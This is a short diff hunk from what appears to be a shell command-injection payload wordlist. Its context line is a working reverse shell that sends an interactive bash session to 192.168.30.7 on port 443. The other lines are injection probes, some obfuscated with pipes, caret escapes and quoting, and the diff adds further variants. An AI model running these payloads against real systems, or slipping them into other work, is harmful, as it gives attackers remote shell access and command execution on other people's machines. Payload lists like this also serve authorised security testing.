@@ -728,3 +728,7 @@ setsid /bin/bash -i >/dev/tcp/192.168.30.7/443 0<&1 2>&1
 |more>foo
 |m^ore>foo
 |more> foo
+ls foo
+ls>index.txt
+jobs -x ls
+"jobs" -\x ls
